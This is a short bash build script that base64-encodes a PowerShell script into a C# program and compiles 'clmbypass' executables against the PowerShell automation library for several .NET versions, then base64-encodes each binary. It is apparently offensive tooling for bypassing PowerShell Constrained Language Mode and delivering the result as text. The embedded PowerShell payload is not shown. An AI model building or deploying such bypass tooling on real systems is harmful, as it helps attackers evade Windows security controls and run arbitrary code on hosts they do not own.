#!/bin/bash 

versions=(v2.0 v3.0 v3.5 v4.0 v4.5 v4.7.2)
script=$(base64 -w 0 command.ps1)
sed -i -E "s|(String cmd = \").*\";|\1$script\";|" Program.cs
echo $script
for version in "${versions[@]}"; do 
  sed -i "s/<TargetFrameworkVersion>v[0-9.]*<\/TargetFrameworkVersion>/<TargetFrameworkVersion>$version<\/TargetFrameworkVersion>/g" clmbypass.csproj
  csc Program.cs /reference:bin/Debug/System.Management.Automation.dll /out:./bin/clmbypass-$version.exe 
  base64 -w 0 ./bin/clmbypass-$version.exe > ./bin/clmbypass-$version.txt  
done
